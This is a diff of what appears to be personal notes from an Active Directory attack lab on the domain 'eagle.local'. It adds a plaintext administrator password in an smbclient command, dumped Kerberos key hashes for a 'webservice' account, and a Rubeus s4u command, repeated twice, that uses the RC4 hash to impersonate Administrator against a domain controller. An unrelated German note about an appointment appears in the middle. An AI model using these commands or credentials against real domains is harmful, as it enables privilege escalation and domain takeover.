@@ -23,7 +23,22 @@ smbclient \\\\$TARGET \\Share -U eagle/administrator%Slavi123
 put
 get
 
+webservice
+http/DC1
+FCDC65703DD2B0BD789977F1F3EEAECF
+
+[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF
+[*]       aes128_cts_hmac_sha1 : 89E50DBF46388A7DBDB3EAAE80C6030F
+[*]       aes256_cts_hmac_sha1 : D7480FABB291BDAC59D66B97812C3382A02AB9895D1C1B95A1AF520BAE08488B
+[*]       des_cbc_md5          : 3D62D0CBEFB6D39B
+
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /mdsspn:"http/dc1" /dc:dc1.eagle.local
 
 ```
 Ich habe einen Termin für den 4.12.2024, aber da ich schon alle Unterlagen habe, versuche ich einen früheren zu bekommen. Falls ich einen früheren Termin bekommen, werde ich den für Dezember stornieren.
 ```
+
+
+   
+
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /mdsspn:"http/dc1" /dc:dc1.eagle.local
